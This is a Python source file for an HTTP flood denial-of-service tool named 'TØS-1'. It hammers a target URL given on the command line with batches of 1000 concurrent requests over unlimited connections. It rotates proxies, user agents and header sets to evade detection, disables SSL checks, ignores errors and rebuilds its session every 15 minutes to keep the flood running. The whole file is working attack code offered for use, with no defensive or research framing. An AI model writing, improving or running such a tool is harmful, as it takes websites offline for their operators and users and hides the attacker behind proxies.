import asyncio
import aiohttp
import random
import time
import os
import sys

class TOS1:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session_id = "S023"
        self.total_requests = 0
        self.running = True
        self.attack_active = True
        self.start_time = time.time()
        
        # Load resources
        self.proxies = self.load_file("main.txt")
        self.user_agents = self.load_file("ua.txt")
        
        # Headers rotation
        self.headers_pool = self.generate_real_headers()
        self.current_headers = {}
        self.current_proxy = ""
        self.current_ua = ""
        
        # MAX CONCURRENCY
        self.concurrency = 1000  # RAMPED UP
        self.semaphore = asyncio.Semaphore(self.concurrency)
        
        # Session
        self.session = None
        self.connector = None
        
        # Last maintenance
        self.last_maintenance = time.time()
        
    def load_file(self, filename):
        """Load lines from file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    def generate_real_headers(self):
        """Generate realistic looking headers"""
        return [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache'
            },
            {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
        ]
    
    def rotate_resources(self):
        """Rotate proxy, UA, and headers"""
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)
        
        if self.user_agents:
            self.current_ua = random.choice(self.user_agents)
        
        self.current_headers = random.choice(self.headers_pool).copy()
        if self.current_ua:
            self.current_headers['User-Agent'] = self.current_ua
    
    async def create_session(self):
        """Create optimized aiohttp session"""
        self.connector = aiohttp.TCPConnector(
            limit=0,  # Unlimited connections
            limit_per_host=0,
            ttl_dns_cache=0,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=aiohttp.ClientTimeout(total=3)  # Short timeout
        )
        self.rotate_resources()
    
    async def send_request(self):
        """Send single request - MAX SPEED"""
        if not self.session or not self.attack_active:
            return
        
        try:
            proxy_url = f"http://{self.current_proxy}" if self.current_proxy else None
            
            async with self.session.get(
                self.target_url,
                headers=self.current_headers,
                proxy=proxy_url,
                ssl=False
            ) as response:
                await response.read()  # Read but don't process
                
        except:
            pass  # SILENT FAIL - MAX SPEED
        
        finally:
            self.total_requests += 1
    
    def update_display(self):
        """Update display - ONLY THIS LOGGING"""
        sys.stdout.write(f"\rTØS-1 — {self.total_requests} | {{S023}}")
        sys.stdout.flush()
    
    async def maintenance(self):
        """Perform maintenance every 15 minutes"""
        while self.running:
            current_time = time.time()
            
            if current_time - self.last_maintenance >= 900:  # 15 minutes
                self.attack_active = False
                
                # Close old session
                if self.session:
                    await self.session.close()
                    self.session = None
                    self.connector = None
                
                # Rotate resources
                self.rotate_resources()
                
                # Create new session
                await self.create_session()
                
                # Short wait
                await asyncio.sleep(1)
                
                self.attack_active = True
                self.last_maintenance = current_time
            
            await asyncio.sleep(1)
    
    async def attack_loop(self):
        """MAX SPEED ATTACK LOOP"""
        await self.create_session()
        
        # MAX SPEED LOOP
        while self.running and self.attack_active:
            # CREATE BATCH OF 1000 TASKS
            tasks = []
            for _ in range(1000):  # MAX BATCH SIZE
                tasks.append(self.send_request())
            
            # FIRE ALL AT ONCE
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # UPDATE DISPLAY
            self.update_display()
            
            # MINIMAL DELAY
            await asyncio.sleep(0.00001)
    
    async def run(self):
        """Main run method"""
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        os.system('clear')
        
        # Start maintenance in background
        maintenance_task = asyncio.create_task(self.maintenance())
        
        # MAX SPEED ATTACK
        try:
            await self.attack_loop()
        except KeyboardInterrupt:
            self.running = False
        finally:
            maintenance_task.cancel()
            if self.session:
                await self.session.close()
            sys.exit(0)

# MAIN WITH UVLOOP FOR MAX SPEED
if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Check files
    if not os.path.exists("main.txt"):
        open("main.txt", "w").close()
    
    if not os.path.exists("ua.txt"):
        with open("ua.txt", "w") as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n")
            f.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n")
            f.write("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\n")
    
    # Try to use uvloop for MAX SPEED
    try:
        import uvloop
        uvloop.install()
    except:
        pass
    
    # Increase limits
    import asyncio
    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())
    
    # Run
    tos = TOS1(target)
    asyncio.run(tos.run())
